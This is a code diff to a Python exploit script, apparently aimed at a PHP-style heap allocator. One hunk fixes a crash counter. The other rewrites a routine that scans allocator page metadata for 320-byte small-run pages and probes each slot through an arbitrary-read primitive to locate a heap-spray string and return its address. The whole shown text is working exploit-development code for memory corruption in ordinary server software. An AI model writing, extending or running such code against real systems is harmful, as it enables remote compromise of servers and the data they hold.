@@ -318,6 +318,7 @@ def pin_send(body, content_type, timeout=15, want_raw=False):
         return None
 
     def fail(why):
+        global crash_count
         crash_count += 1
         _log_shot(f'{why} rawlen={len(raw)}')
         PIN['last_raw'] = raw
@@ -1352,38 +1353,49 @@ def find_spray_slot(heap_ref, pinned=True):
     if len(cdata) < MAP_OFF + 512 * 4:
         return None
 
-    bin320_start = None
+    # Collect ALL bin-320 SRUN pages (long-lived workers have the FIRST
+    # bin-320 page packed with old allocations, free_count=0 - the CURRENT
+    # request's own spray lands on a NEWER SRUN page, so every page must
+    # be probed, preferring ones with free slots).
+    bin320_pages = []
     for pn in range(1, 512):
         info = struct.unpack_from('<I', cdata, MAP_OFF + pn * 4)[0]
         is_srun = (info & 0x80000000) != 0
         is_lrun = (info & 0x40000000) != 0
         if is_srun and not is_lrun and (info & 0x1F) == 16:
-            bin320_start = pn
             free_count = (info >> 16) & 0x1FF
-            print(f"  Bin-320 SRUN at page {pn}, free_count={free_count}")
-            break
-
-    if bin320_start is None:
+            bin320_pages.append((pn, free_count))
+    if not bin320_pages:
+        print("  no bin-320 SRUN pages found")
         return None
+    bin320_pages.sort(key=lambda x: (-(x[1]), x[0]))
+    print(f"  bin-320 SRUN pages: {[(f'page {pn}', f'free {fc}') for pn, fc in bin320_pages[:8]]}")
 
-    run_start = chunk_base + bin320_start * 0x1000
-    print(f"  Run start = 0x{run_start:x}")
+    if not bin320_pages:
+        return None
+    pn, _fc = bin320_pages[0]
+    run_start = chunk_base + pn * 0x1000
+    print(f"  Probe base page = {pn} -> 0x{run_start:x}")
 
-    # Probe each 320-byte slot looking for our 280-byte spray string.
-    for slot in range(64):
-        if pinned and not pin_ok():
-            fire_log(f"[R-6] pin budget/dead at slot {slot}; aborting round")
-            return None
-        addr = run_start + slot * 320
-        r2 = isstring_read(addr, pinned=pinned)
-        if r2 is None:
-            continue
-        slen, _ = r2
-        if slen == SPRAY_LEN:
-            S = addr + 0x18
-            print(f"  Found spray at slot {slot} @ 0x{addr:x}")
-            print(f"  S = 0x{S:x}")
-            return S
+    # Probe slots page-bounded (12 x 320B per 4KB page), each SRUN page,
+    # spray slots first (slot 0 tends to be the request's own arData).
+    for pn, _fc in bin320_pages:
+        run_start = chunk_base + pn * 0x1000
+        print(f"  Probing page {pn} @ 0x{run_start:x}")
+        for slot in list(range(1, 12)) + [0]:
+            if pinned and not pin_ok():
+                fire_log(f"[R-6] pin budget/dead at page {pn} slot {slot}; aborting round")
+                return None
+            addr = run_start + slot * 320
+            r2 = isstring_read(addr, pinned=pinned)
+            if r2 is None:
+                continue
+            slen, _ = r2
+            if slen == SPRAY_LEN:
+                S = addr + 0x18
+                print(f"  Found spray at page {pn} slot {slot} @ 0x{addr:x}")
+                print(f"  S = 0x{S:x}")
+                return S
     return None
 
 
